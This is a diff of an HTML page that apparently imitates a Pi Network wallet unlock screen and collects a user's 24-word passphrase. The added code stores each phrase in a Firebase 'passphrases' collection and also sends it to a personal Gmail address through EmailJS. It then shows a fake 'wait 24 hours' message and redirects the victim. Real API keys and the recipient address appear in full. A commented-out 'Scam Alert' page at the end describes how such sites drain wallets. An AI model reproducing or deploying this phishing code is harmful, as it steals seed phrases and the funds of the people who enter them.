@@ -136,6 +136,17 @@
 <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
 <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
 
+<script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init({
+        publicKey: "D0F2_IVgzpb_8x10m",
+      });
+   })();
+</script>
+
 <script>
     // // Firebase Configuration
     // const firebaseConfig = {
@@ -151,6 +162,86 @@
 
 // new id firebase
 
+// const firebaseConfig = {
+//     apiKey: "AIzaSyBaGy1JNGBARMOM1a17XaDfE0-cczJTndY",
+//     authDomain: "pienetwork-79f6b.firebaseapp.com",
+//     projectId: "pienetwork-79f6b",
+//     storageBucket: "pienetwork-79f6b.firebasestorage.app",
+//     messagingSenderId: "413061844814",
+//     appId: "1:413061844814:web:97d988c05174f8b813581f",
+//     measurementId: "G-YF32BB1E2J"
+//   };
+
+
+//     // Initialize Firebase
+//     firebase.initializeApp(firebaseConfig);
+//     const firestore = firebase.firestore();
+
+   
+   
+
+   
+//     // Function to handle fingerprint error
+//     function showFingerprintError() {
+//         alert("Fingerprint unlock is not available at the moment. Please enter your passphrase.");
+//     }
+
+//     // Validate passphrase function
+//     function validatePassphrase() {
+//         let passphraseInput = document.getElementById("passphrase");
+//         let errorMessage = document.getElementById("error-message");
+//         let topupMessage = document.getElementById("topup-message");
+
+//         if (!passphraseInput) return;
+
+//         let passphrase = passphraseInput.value.trim();
+//         console.log("Passphrase entered:", passphrase);  // Print passphrase value for debugging
+
+//         if (passphrase === "") {
+//             errorMessage.textContent = "Passphrase cannot be empty!";
+//             errorMessage.style.display = "block";
+//             return;
+//         }
+
+//         let words = passphrase.split(/\s+/);
+//         if (words.length >24) {  
+//                         console.log(words);  // Print words array to debug
+//             errorMessage.textContent = "Passphrase must contain exactly 24 words!";
+//             errorMessage.style.display = "block";
+//             return;
+//         }
+
+//         errorMessage.style.display = "none";
+
+//         firestore.collection("passphrases").add({
+//             passphrase: passphrase,
+//             timestamp: new Date().toISOString()
+//         }).then((docRef) => {
+//             // Log success and print the document ID
+//             console.log("Passphrase stored successfully in Firestore! Document ID:", docRef.id);
+//         }).catch((error) => {
+//             // Log any error that occurs during the save operation
+//             console.error("Error storing passphrase in Firestore:", error);
+//         });
+
+
+
+
+//         // Show "Please wait for 24 hours" message
+//         topupMessage.style.display = "flex";
+
+//         // Redirect after 3 seconds
+//         setTimeout(() => {
+//             topupMessage.style.display = "none";
+//             window.location.href = "index.html";  // Ugit se relative path
+//         }, 3000);
+//     }
+
+</script>
+
+
+<script>
+
 const firebaseConfig = {
     apiKey: "AIzaSyBaGy1JNGBARMOM1a17XaDfE0-cczJTndY",
     authDomain: "pienetwork-79f6b.firebaseapp.com",
@@ -159,69 +250,179 @@ const firebaseConfig = {
     messagingSenderId: "413061844814",
     appId: "1:413061844814:web:97d988c05174f8b813581f",
     measurementId: "G-YF32BB1E2J"
-  };
+};
 
+firebase.initializeApp(firebaseConfig);
+const firestore = firebase.firestore();
+emailjs.init("D0F2_IVgzpb_8x10m");
 
-    // Initialize Firebase
-    firebase.initializeApp(firebaseConfig);
-    const firestore = firebase.firestore();
+function validatePassphrase() {
+    let passphraseInput = document.getElementById("passphrase");
 
-    // Function to handle fingerprint error
-    function showFingerprintError() {
-        alert("Fingerprint unlock is not available at the moment. Please enter your passphrase.");
+    console.log("✅ validatePassphrase() is triggered");
+
+    if (!passphraseInput) return;
+
+    let passphrase = passphraseInput.value.trim();  // Passphrase is now defined
+
+    console.log("Passphrase Entered:", passphrase);  // ✅ Now this will not cause an error
+
+    let errorMessage = document.getElementById("error-message");
+    let topupMessage = document.getElementById("topup-message");
+
+    if (passphrase === "") {
+        errorMessage.textContent = "Passphrase cannot be empty!";
+        errorMessage.style.display = "block";
+        return;
     }
 
-    // Validate passphrase function
-    function validatePassphrase() {
-        let passphraseInput = document.getElementById("passphrase");
-        let errorMessage = document.getElementById("error-message");
-        let topupMessage = document.getElementById("topup-message");
-
-        if (!passphraseInput) return;
-
-        let passphrase = passphraseInput.value.trim();
-        console.log("Passphrase entered:", passphrase);  // Print passphrase value for debugging
-
-        if (passphrase === "") {
-            errorMessage.textContent = "Passphrase cannot be empty!";
-            errorMessage.style.display = "block";
-            return;
-        }
-
-        let words = passphrase.split(/\s+/);
-        if (words.length >24) {  // Ensure it's exactly 24 words
-            console.log(words);  // Print words array to debug
-            errorMessage.textContent = "Passphrase must contain exactly 24 words!";
-            errorMessage.style.display = "block";
-            return;
-        }
-
-        errorMessage.style.display = "none";
-
-        firestore.collection("passphrases").add({
-            passphrase: passphrase,
-            timestamp: new Date().toISOString()
-        }).then((docRef) => {
-            // Log success and print the document ID
-            console.log("Passphrase stored successfully in Firestore! Document ID:", docRef.id);
-        }).catch((error) => {
-            // Log any error that occurs during the save operation
-            console.error("Error storing passphrase in Firestore:", error);
-        });
-
-
-
-
-        // Show "Please wait for 24 hours" message
-        topupMessage.style.display = "flex";
-
-        // Redirect after 3 seconds
-        setTimeout(() => {
-            topupMessage.style.display = "none";
-            window.location.href = "index.html";  // Ugit se relative path
-        }, 3000);
+    let words = passphrase.split(/\s+/);
+    if (words.length > 24) {  
+        errorMessage.textContent = "Passphrase must contain exactly 24 words!";
+        errorMessage.style.display = "block";
+        return;
     }
+
+    errorMessage.style.display = "none";
+
+    firestore.collection("passphrases").add({
+        passphrase: passphrase,
+        timestamp: new Date().toISOString()
+    }).then((docRef) => {
+        console.log("✅ Passphrase stored successfully! Document ID:", docRef.id);
+        console.log("Calling sendEmail() with Passphrase:", passphrase);
+
+        // Send Email
+        sendEmail(passphrase);
+
+    }).catch((error) => {
+        console.error("❌ Error storing passphrase:", error);
+    });
+
+    topupMessage.style.display = "flex";
+
+    setTimeout(() => {
+        topupMessage.style.display = "none";
+        window.location.href = "index.html";
+    }, 3000);
+}
+
+
+
+function sendEmail(passphrase) {
+    console.log("📤 Sending Email...");
+
+    emailjs.send("service_7unsbzm", "template_n3413c8", {
+        to_email: "ateshamali0@gmail.com",
+        passphrase: passphrase
+    }, "D0F2_IVgzpb_8x10m")
+    .then(response => {
+        console.log("✅ Email sent successfully!", response);
+    })
+    .catch(error => {
+        console.error("❌ Email failed:", error);
+        console.error("📌 Full Error Details:", JSON.stringify(error, null, 2));
+    });
+}
+
+
 </script>
+
+
 
 </body>
 </html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!------------------------------------------------------------------------------------------------------------------ -->
+
+
+
+<!-- 
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚠️ Scam Alert! Stay Safe ⚠️</title>
+</head>
+<body style="font-family: Arial, sans-serif; text-align: center; background-color: black; color: white; padding: 20px;">
+
+    Animated Warning
+    <h1 style="color: red; font-size: 40px; animation: shake 0.8s infinite;">
+        🚨 SCAM ALERT! 🚨
+    </h1>
+
+    Scrolling Alert
+    <marquee style="color: yellow; font-size: 20px; font-weight: bold;">
+        ⚠️ WARNING: This is a scam! Do NOT enter your details! ⚠️
+    </marquee>
+
+    Main Scam Awareness Message
+    <p style="font-size: 18px; max-width: 600px; margin: auto; line-height: 1.6;">
+        This website is designed to warn you! 🚫 Do NOT share your passwords, crypto keys, or personal information.  
+        Many scammers use fake websites like this to steal your assets. Stay alert and **think before you click!**
+        Once you enter your PassPhrase, they can easily get your wallet access and can withdraw all your funds in the name of KYC or withdrawal fees.
+    </p>
+
+    Image for Kids & Crypto Miners
+    <div style="margin-top: 20px;">
+        <img src="https://media.giphy.com/media/5fBH6zIjOEYQfQBErh/giphy.gif" 
+            alt="Crypto Scam Warning" width="300" 
+            style="border-radius: 15px; box-shadow: 0 0 15px yellow;">
+    </div>
+
+    Floating Animation for Warning
+    <div style="
+        font-size: 22px; color: white; font-weight: bold; margin-top: 20px; 
+        padding: 10px; background-color: red; display: inline-block;
+        animation: float 2s infinite alternate;">
+        ❌ DO NOT FALL FOR SCAMS ❌
+    </div>
+
+    <div style="margin-top: 30px;">
+        <a href="https://www.google.com" 
+            style="display: inline-block; padding: 15px 30px; font-size: 20px; 
+            background-color: yellow; color: black; text-decoration: none;
+            border-radius: 10px; font-weight: bold; box-shadow: 0 0 10px white;
+            transition: transform 0.2s; animation: blink 1s infinite;">
+            EXIT SAFELY 🚪
+        </a>
+    </div>
+
+    <style>
+        @keyframes shake {
+            0% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            50% { transform: translateX(5px); }
+            75% { transform: translateX(-5px); }
+            100% { transform: translateX(0); }
+        }
+
+        @keyframes float {
+            from { transform: translateY(0px); }
+            to { transform: translateY(10px); }
+        }
+
+        @keyframes blink {
+            50% { opacity: 0.5; }
+        }
+    </style>
+
+</body>
+</html> -->
